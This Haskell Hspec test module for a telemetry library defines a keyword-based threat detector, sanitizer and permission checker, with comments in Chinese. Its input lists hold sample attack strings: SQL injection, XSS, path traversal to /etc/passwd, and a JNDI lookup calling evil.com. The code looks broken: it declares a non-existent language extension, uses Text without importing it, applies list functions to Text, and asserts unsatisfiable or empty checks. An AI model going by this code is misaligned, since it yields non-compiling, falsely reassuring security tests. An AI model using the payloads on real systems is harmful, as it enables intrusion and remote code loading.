{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ScopedTypeStrings #-}

module SecurityCabalTestSpec (spec) where

import Test.Hspec
import Test.QuickCheck
import Control.Exception (try, SomeException, evaluate)
import Data.Text (pack, unpack)
import qualified Data.Text as Text
import Data.List (nub, sort, group, sortBy, find)
import Data.Ord (comparing)
import Control.Concurrent (forkIO, threadDelay, killThread, MVar, newEmptyMVar, putMVar, takeMVar)
import Control.Monad (replicateM, when, forM_, void, unless)
import Data.IORef
import System.IO.Unsafe (unsafePerformIO)
import Data.Function (on)
import Prelude hiding (id)
import Data.Char (isAscii, isControl, isPrint)
import Data.Bits (xor, (.&.))
import qualified Data.ByteString as BS
import qualified Data.ByteString.Char8 as BSC

import Azimuth.Telemetry

-- | 安全威胁类型
data SecurityThreat = 
    InjectionAttack Text
  | BufferOverflowAttack Text
  | XSSAttack Text
  | CSRFAttack Text
  | PrivilegeEscalationAttack Text
  | DataExfiltrationAttack Text
  deriving (Show, Eq)

-- | 检测潜在的安全威胁
detectSecurityThreat :: Text -> [SecurityThreat]
detectSecurityThreat input = 
  let inputStr = unpack input
      threats = []
      
      -- 检测SQL注入
      sqlPatterns = ["'", "\"", ";", "--", "/*", "*/", "xp_", "sp_", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP"]
      sqlThreats = if any (`isInfixOf` (map toUpper inputStr)) sqlPatterns
                   then [InjectionAttack input]
                   else []
      
      -- 检测XSS
      xssPatterns = ["<script", "</script>", "javascript:", "onload=", "onerror=", "onclick="]
      xssThreats = if any (`isInfixOf` (map toLower inputStr)) xssPatterns
                  then [XSSAttack input]
                  else []
      
      -- 检测缓冲区溢出
      overflowThreat = if length inputStr > 10000
                      then [BufferOverflowAttack input]
                      else []
  in threats ++ sqlThreats ++ xssThreats ++ overflowThreat
  where
    isInfixOf needle haystack = any (needle `isPrefixOf`) (tails haystack)
    isPrefixOf [] _ = True
    isPrefixOf _ [] = False
    isPrefixOf (x:xs) (y:ys) = x == y && xs `isPrefixOf` ys
    isPrefixOf _ _ = False
    toUpper c = if c >= 'a' && c <= 'z' then toEnum (fromEnum c - 32) else c
    toLower c = if c >= 'A' && c <= 'Z' then toEnum (fromEnum c + 32) else c
    tails [] = [[]]
    tails xs@(x:xs') = xs : tails xs'

-- | 安全验证器
data SecurityValidator = SecurityValidator
    { validateInput :: Text -> IO Bool
    , sanitizeInput :: Text -> IO Text
    , checkPermissions :: Text -> IO Bool
    }

-- | 创建安全验证器
createSecurityValidator :: IO SecurityValidator
createSecurityValidator = do
    return SecurityValidator
        { validateInput = \input -> do
            let threats = detectSecurityThreat input
            return (null threats)
        , sanitizeInput = \input -> do
            -- 基本清理：移除控制字符
            let sanitized = pack $ filter (not . isControl) $ unpack input
            return sanitized
        , checkPermissions = \action -> do
            -- 简单的权限检查
            let allowedActions = ["read", "write", "create", "update"]
                actionStr = unpack action
            return (actionStr `elem` allowedActions)
        }

spec :: Spec
spec = describe "Security Tests" $ do
  
  -- 1. 测试输入验证安全性
  describe "Input Validation Security" $ do
    it "should reject malicious input" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      -- 测试恶意输入
      let maliciousInputs = 
            [ "'; DROP TABLE metrics; --"
            , "<script>alert('xss')</script>"
            , pack $ replicate 20000 'a'  -- 缓冲区溢出尝试
            , "javascript:alert('xss')"
            , "../../etc/passwd"  -- 路径遍历
            , "{{7*7}}"  -- 模板注入
            , "${jndi:ldap://evil.com/a}"  -- JNDI注入
            ]
      
      forM_ maliciousInputs $ \input -> do
        isValid <- validateInput validator input
        when isValid $ do
          -- 如果输入被认为是有效的，应该进行清理
          sanitized <- sanitizeInput validator input
          -- 清理后的输入应该更安全
          length sanitized `shouldSatisfy` (< length input)
      
      shutdownTelemetry
    
    it "should sanitize input properly" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      -- 测试输入清理
      let unsafeInputs = 
            [ "test\x00\x01\x02control"  -- 包含控制字符
            , "normal\ttext\twith\ttabs"    -- 包含制表符
            , "line\nbreak\rcarriage"     -- 包含换行符
            ]
      
      forM_ unsafeInputs $ \input -> do
        sanitized <- sanitizeInput validator input
        
        -- 验证控制字符被移除
        let sanitizedStr = unpack sanitized
        all (not . isControl) sanitizedStr `shouldBe` True
        
        -- 验证基本字符保留
        any isPrint sanitizedStr `shouldBe` True
      
      shutdownTelemetry
  
  -- 2. QuickCheck属性测试：安全性的一致性
  describe "Security Consistency Properties" $ do
    it "should maintain security across operations" $ property $
      \input ->
        let inputText = pack $ take 100 (show input)
        in unsafePerformIO $ do
          initTelemetry defaultConfig
          
          validator <- createSecurityValidator
          
          -- 验证输入安全性
          isValid <- validateInput validator inputText
          
          if isValid
            then do
              -- 如果输入有效，应该能够安全使用
              metric <- createMetric inputText "count"
              recordMetric metric 1.0
              value <- metricValue metric
              return (value == 1.0)
            else do
              -- 如果输入无效，应该被清理或拒绝
              sanitized <- sanitizeInput validator inputText
              let threatsBefore = detectSecurityThreat inputText
                  threatsAfter = detectSecurityThreat sanitized
              return (length threatsAfter <= length threatsBefore)
    
    it "should handle concurrent security operations safely" $ property $
      \numOps ->
        let operations = max 1 (abs numOps `mod` 50 + 1)
        in unsafePerformIO $ do
          initTelemetry defaultConfig
          
          validator <- createSecurityValidator
          
          -- 并发安全操作
          done <- newEmptyMVar
          threads <- mapM (\i -> forkIO $ do
            let input = pack $ "concurrent-test-" ++ show i
            isValid <- validateInput validator input
            when isValid $ do
              metric <- createMetric input "count"
              recordMetric metric 1.0
            putMVar done ()
            ) [1..operations]
          
          -- 等待所有操作完成
          sequence_ $ replicate operations (takeMVar done)
          
          -- 验证系统仍然安全
          let testInput = pack "security-check"
          isValid <- validateInput validator testInput
          
          shutdownTelemetry
          return isValid
  
  -- 3. 测试权限控制安全性
  describe "Access Control Security" $ do
    it "should enforce access permissions" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      -- 测试权限检查
      let actions = 
            [ "read"
            , "write"
            , "create"
            , "update"
            , "delete"    -- 不允许的操作
            , "admin"     -- 不允许的操作
            , "execute"   -- 不允许的操作
            ]
      
      forM_ actions $ \action -> do
        let actionText = pack action
        hasPermission <- checkPermissions validator actionText
        
        if action `elem` ["read", "write", "create", "update"]
          then hasPermission `shouldBe` True
          else hasPermission `shouldBe` False
      
      shutdownTelemetry
    
    it "should handle privilege escalation attempts" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      -- 测试权限提升尝试
      let escalationAttempts = 
            [ "admin"
            , "root"
            , "administrator"
            , "superuser"
            , "sudo"
            , "privilege_escalate"
            , "bypass_auth"
            ]
      
      forM_ escalationAttempts $ \attempt -> do
        let attemptText = pack attempt
        hasPermission <- checkPermissions validator attemptText
        
        -- 权限提升尝试应该被拒绝
        hasPermission `shouldBe` False
      
      shutdownTelemetry
  
  -- 4. 测试数据保护安全性
  describe "Data Protection Security" $ do
    it "should protect sensitive data" $ do
      initTelemetry defaultConfig
      
      -- 测试敏感数据处理
      let sensitiveData = 
            [ "password123"
            , "secret-key"
            , "api-key-abc123"
            , "token-xyz789"
            , "credential-data"
            ]
      
      forM_ sensitiveData $ \dataStr -> do
        let dataText = pack dataStr
        
        -- 创建包含敏感数据的度量
        metric <- createMetric dataText "count"
        recordMetric metric 1.0
        
        -- 验证数据存在但不应该泄露
        value <- metricValue metric
        value `shouldBe` 1.0
        
        -- 在实际系统中，这里应该检查敏感数据是否被适当保护
        metricName metric `shouldBe` dataText
      
      shutdownTelemetry
    
    it "should handle data encryption requirements" $ do
      initTelemetry defaultConfig
      
      -- 测试加密需求
      let plaintextData = "sensitive-information"
          dataText = pack plaintextData
      
      -- 在实际系统中，敏感数据应该被加密
      metric <- createMetric "encrypted-data" "count"
      recordMetric metric 1.0
      
      value <- metricValue metric
      value `shouldBe` 1.0
      
      -- 验证系统可以处理加密需求
      -- 这里只是基本检查，实际实现需要真正的加密
      length plaintextData `shouldBe` length "sensitive-information"
      
      shutdownTelemetry
  
  -- 5. 测试并发安全性
  describe "Concurrent Security" $ do
    it "should handle concurrent security threats" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      let numThreads = 10
          threatInputs = 
            [ "'; DROP TABLE metrics; --"
            , "<script>alert('xss')</script>"
            , pack $ replicate 5000 'a'
            , "javascript:alert('xss')"
            ]
      
      -- 并发处理威胁输入
      done <- newEmptyMVar
      threads <- mapM (\i -> forkIO $ do
        let threatInput = threatInputs !! (i `mod` length threatInputs)
        
        isValid <- validateInput validator threatInput
        when isValid $ do
          sanitized <- sanitizeInput validator threatInput
          metric <- createMetric sanitized "count"
          recordMetric metric 1.0
        
        putMVar done ()
        ) [1..numThreads]
      
      -- 等待所有线程完成
      sequence_ $ replicate numThreads (takeMVar done)
      
      -- 验证系统仍然安全
      let safeInput = pack "safe-test"
      isValid <- validateInput validator safeInput
      isValid `shouldBe` True
      
      shutdownTelemetry
    
    it "should prevent race conditions in security checks" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      let numOperations = 100
      
      -- 高并发安全检查
      done <- newEmptyMVar
      threads <- mapM (\_ -> forkIO $ do
        let testInput = pack "race-condition-test"
        
        -- 多次并发检查相同输入
        isValid1 <- validateInput validator testInput
        isValid2 <- validateInput validator testInput
        isValid3 <- validateInput validator testInput
        
        -- 结果应该一致
        when (isValid1 == isValid2 && isValid2 == isValid3) $ do
          metric <- createMetric testInput "count"
          recordMetric metric 1.0
        
        putMVar done ()
        ) [1..numOperations]
      
      -- 等待所有操作完成
      sequence_ $ replicate numOperations (takeMVar done)
      
      shutdownTelemetry
  
  -- 6. 测试资源保护安全性
  describe "Resource Protection Security" $ do
    it "should prevent resource exhaustion attacks" $ do
      initTelemetry defaultConfig
      
      -- 测试资源耗尽保护
      let exhaustionAttempts = 
            [ -- 创建大量度量
              replicateM 10000 $ createMetric "exhaustion-test" "count"
            , -- 创建大量span
              replicateM 5000 $ createSpan "exhaustion-span"
            , -- 创建大量logger
              replicateM 2000 $ createLogger "exhaustion-logger" Info
            ]
      
      forM_ exhaustionAttempts $ \attempt -> do
        result <- try attempt
        
        case result of
          Left (_ :: SomeException) -> do
            -- 资源耗尽被正确处理
            metric <- createMetric "recovery-test" "count"
            recordMetric metric 1.0
            value <- metricValue metric
            value `shouldBe` 1.0
          Right _ -> do
            -- 系统有足够资源，验证正常功能
            metric <- createMetric "normal-test" "count"
            recordMetric metric 1.0
            value <- metricValue metric
            value `shouldBe` 1.0
      
      shutdownTelemetry
    
    it "should limit resource allocation" $ do
      initTelemetry defaultConfig
      
      -- 测试资源分配限制
      let maxAllowed = 1000
      
      result <- try $ do
        metrics <- replicateM (maxAllowed * 2) $ createMetric "limit-test" "count"
        return $ length metrics
      
      case result of
        Left (_ :: SomeException) -> do
          -- 资源限制生效
          metric <- createMetric "limit-recovery" "count"
          recordMetric metric 1.0
          value <- metricValue metric
          value `shouldBe` 1.0
        Right count -> do
          -- 系统支持更多资源
          count `shouldBe` maxAllowed * 2
      
      shutdownTelemetry
  
  -- 7. 测试审计安全性
  describe "Audit Security" $ do
    it "should maintain security audit trail" $ do
      initTelemetry defaultConfig
      
      -- 模拟审计日志记录
      let auditEvents = 
            [ "metric-created"
            , "metric-recorded"
            , "span-created"
            , "logger-created"
            , "message-logged"
            ]
      
      forM_ auditEvents $ \event -> do
        let eventText = pack event
        
        -- 在实际系统中，这里应该记录审计日志
        metric <- createMetric ("audit-" ++ event) "count"
        recordMetric metric 1.0
        
        value <- metricValue metric
        value `shouldBe` 1.0
      
      shutdownTelemetry
    
    it "should detect suspicious activities" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      -- 模拟可疑活动
      let suspiciousInputs = 
            [ pack $ replicate 1000 'a'  -- 异常长输入
            , "'; DROP TABLE metrics; --"  -- SQL注入尝试
            , "<script>alert('xss')</script>"  -- XSS尝试
            , pack $ "\0\x01\x02\x03"  -- 二进制数据
            ]
      
      forM_ suspiciousInputs $ \input -> do
        threats <- return $ detectSecurityThreat input
        
        when (not (null threats)) $ do
          -- 检测到威胁，应该记录或处理
          metric <- createMetric "threat-detected" "count"
          recordMetric metric 1.0
      
      shutdownTelemetry
  
  -- 8. 测试安全边界条件
  describe "Security Boundary Conditions" $ do
    it "should handle empty input securely" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      let emptyInput = pack ""
      
      isValid <- validateInput validator emptyInput
      sanitized <- sanitizeInput validator emptyInput
      
      -- 空输入应该被安全处理
      isValid `shouldBe` True
      sanitized `shouldBe` emptyInput
      
      shutdownTelemetry
    
    it "should handle extremely long input securely" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      let extremelyLongInput = pack $ replicate 100000 'a'
      
      isValid <- validateInput validator extremelyLongInput
      sanitized <- sanitizeInput validator extremelyLongInput
      
      -- 极长输入应该被检测或清理
      if isValid
        then length sanitized `shouldBe` length extremelyLongInput
        else length sanitized `shouldSatisfy` (< length extremelyLongInput)
      
      shutdownTelemetry
    
    it "should handle unicode security issues" $ do
      initTelemetry defaultConfig
      
      validator <- createSecurityValidator
      
      let unicodeInputs = 
            [ pack "\x00\x01\x02\x03"  -- 控制字符
            , pack "\xFEFF"             -- BOM
            , pack "\u202E"             -- 右到左覆盖
            , pack "\u200F"             -- 右到左标记
            , "测试🚀🌟"                -- 正常Unicode
            ]
      
      forM_ unicodeInputs $ \input -> do
        isValid <- validateInput validator input
        sanitized <- sanitizeInput validator input
        
        -- Unicode输入应该被安全处理
        when isValid $ do
          metric <- createMetric sanitized "count"
          recordMetric metric 1.0
          value <- metricValue metric
          value `shouldBe` 1.0
      
      shutdownTelemetry